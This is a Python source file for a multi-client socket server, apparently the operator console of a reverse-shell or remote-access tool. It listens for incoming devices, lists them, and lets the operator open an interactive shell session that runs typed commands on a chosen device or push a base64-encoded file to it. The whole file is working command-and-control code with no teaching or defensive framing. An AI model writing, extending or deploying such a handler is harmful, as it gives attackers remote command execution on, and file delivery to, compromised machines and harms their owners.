import base64
import os
import socket
import threading
from queue import Queue
from tkinter import filedialog


class SocketConnection:
    connections = []
    addresses = []
    quit_connection = 'Quit'
    threads = 2
    jobs = [1, 2]
    queue = Queue()

    def __init__(self, ip='127.0.0.1', port=4001):
        self.ip = ip
        self.port = port
        self.socket = None
        self.file = filedialog.askopenfilename(title='Select File', defaultextension='.txt',
                                               filetypes=[('', '*.csv *.CSV *.txt')])
        self.name = os.path.basename(os.path.splitext(self.file)[0])
        self.extension = os.path.splitext(self.file)[1]

    def create_a_socket(self):
        print('Creating a socket ...')
        self.socket = socket.socket()

    def bind_and_listen_to_socket_connections(self):
        print('Binding ip address to port number ...')
        self.socket.bind((self.ip, self.port))
        print('Listening for connections ...\n')
        self.socket.listen(10)

    def accept_connections(self):
        for connection in self.connections:
            connection.close()
        del self.connections[:]
        del self.addresses[:]
        while True:
            connection, address = self.socket.accept()
            # print(connection, address)
            self.socket.setblocking(1)
            self.connections.append(connection)
            self.addresses.append(address)
            print('-------Available commands------ ' + '(' + str(len(self.connections)) + ' device (s) connected)')
            print('list - List all connections.\nconnect <index> - Connect to selected connection.')

    def manage_connections(self):
        while True:
            command = input('erastus~$')
            if command == 'list':
                self.list_all_connections()
            elif command == '1':
                self.list_all_connections()
            elif 'connect' in command:
                connection = self.connect_to_selected(command)
                if connection:
                    self.send_commands(connection)
            else:
                print('Invalid option.')

    def list_all_connections(self):
        output = []
        for i, connection in enumerate(self.connections):
            try:
                connection.send(str.encode(' '))
                connection.recv(20480)
            except Exception:
                del self.connections[i]
                del self.addresses[i]
                continue
            output.append(str(i) + ': ' + self.addresses[i][0])
        print('Connect to listed connection by entering <connect (index)>')
        for i in output:
            print(i)

    def connect_to_selected(self, command):
        get_connection = command.replace('connect ', '')
        selected_connection = int(get_connection)
        connection = self.connections[selected_connection]
        print(f'Connected to {self.addresses[selected_connection]}')
        return connection

    def send_commands(self, connected):
        print('----Commands-----')
        print('transfer - transfer files\nshell - activate a shell session')
        while True:
            command = input()
            if command == self.quit_connection.lower():
                break
            elif command == 'transfer':
                self.transfer_files(connected)
            elif command == 'shell':
                if len(str.encode(command)) > 0:
                    print('Shell activated')
                    print('Enter shell commands')
                    while True:
                        command = input()
                        connected.send(str.encode(command))
                        response = str(connected.recv(20480), 'utf-8')
                        print(response, end='')

    def transfer_files(self, connected):
        try:
            name = self.name
            if len(name) > 2:
                name = name[:2]

            with open(self.file, 'rb') as f:
                connected.send(base64.b64encode(
                    str.encode(name) + str.encode('transfer') + f.read(20480) + str.encode(self.extension)))
            print('Transferring files')
            print(str(connected.recv(20480), 'utf-8'))
        except FileNotFoundError:
            print('No file selected')

    def create_threads(self):
        for _ in range(self.threads):
            thread = threading.Thread(target=self.work)
            thread.daemon = True
            thread.start()

    def work(self):
        while True:
            job = self.queue.get()
            if job == 1:
                self.create_a_socket()
                self.bind_and_listen_to_socket_connections()
                self.accept_connections()
            elif job == 2:
                self.manage_connections()

    def next_job(self):
        for i in self.jobs:
            self.queue.put(i)
        self.queue.join()


if __name__ == '__main__':
    connect = SocketConnection()
    connect.create_threads()
    connect.next_job()
